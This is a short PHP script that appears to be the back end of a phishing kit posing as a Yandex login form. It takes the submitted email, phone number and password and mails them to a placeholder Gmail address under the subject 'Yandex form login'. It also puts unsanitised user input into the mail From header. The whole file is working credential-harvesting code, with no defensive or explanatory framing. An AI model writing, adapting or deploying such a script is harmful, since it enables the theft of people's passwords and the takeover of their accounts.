<?php
if (isset($_POST['name'])){
    $yourName =  "Email: " . $_POST['name'] . "\r\n";
    $yourPhone =  "Phone: " . $_POST['phone'] . "\r\n";
    $yourPassword =  "Password: " . $_POST['password'] . "\r\n";
    
    
    $to = 'yourMailhere@gmail.com';

    $subject = 'Yandex form login';


    $headers = 'From: '. $_POST['name'] . "\r\n";


    $message = $yourName . $yourPhone . $yourPassword ;


    $subject = preg_replace("/(\r\n)|(\r)|(\n)/", "", $subject);
    $subject = preg_replace("/(\t)/", " ", $subject);
    $subject = '=?UTF-8?B?' . base64_encode($subject) . '?=';


    mail($to, $subject, $message, $headers);

}
?>